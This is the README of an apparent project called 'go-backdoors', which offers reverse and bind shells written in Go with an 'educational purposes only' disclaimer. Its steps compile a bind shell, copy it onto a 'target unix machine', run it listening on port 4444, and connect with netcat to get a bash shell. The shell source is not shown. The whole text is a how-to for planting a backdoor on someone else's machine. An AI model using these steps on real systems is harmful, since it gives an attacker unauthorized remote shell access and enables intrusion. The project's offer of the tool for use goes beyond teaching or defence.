# go-backdoors

Simple reverse and bind shells written in Go. In order to use these backdoors, you will need to have Go installed on your machine. 

## Bind Shell

To use this bind shell, first compile it by running:

```bash
go build bindshell.go
```

This will create an executable file called `bindshell`. Copy this file onto the target unix machine, and give it the necessary permissions:

```bash
chmod +x ./bindshell
```

Finally, run it from whatever directory it is placed in with:

```bash
./bindshell
```

This will start the bind shell listening on port 4444. To connect to it, I recommend using **Netcat**:

```bash
nc <target-ip> 4444
```

Once you have completed this, you should be presented with a basic bash shell!

*Note: This project is for educational purposes only. I do not expect it to be perfect, but if you do have any questions about it please feel free to ask. You can reach me through github (I think?) or just send me an email at nineofpine@protonmail.com*
